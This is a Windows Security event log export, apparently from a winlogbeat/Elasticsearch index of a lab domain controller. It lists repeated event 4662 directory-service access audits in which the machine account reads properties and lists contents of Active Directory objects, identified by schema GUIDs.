				
	Access Mask:		0x10
	Properties:		Read Property
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109664	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.063"	"whC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109663	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.063"	"wRC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109662	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.063"	"wBC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
			{f3a64788-5306-11d1-a9c5-0000f80367c1}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
			{f3a64788-5306-11d1-a9c5-0000f80367c1}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109657	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.063"	"vxC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109656	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.063"	"vhC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109655	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.060"	"vRC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109648	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.060"	"vBC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109647	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.060"	"uxC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109646	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.060"	"uhC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109639	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.060"	"uRC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109638	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.060"	"uBC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109637	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:10.809"	"txC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D296

Object:
	Object Server:		DS
	Object Type:		%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
	Object Name:		%{0a1cb556-6e0e-4a04-a14e-244e0208b1f3}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e5-0de6-11d0-a285-00aa003049e2}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{bf967953-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967976-0de6-11d0-a285-00aa003049e2}
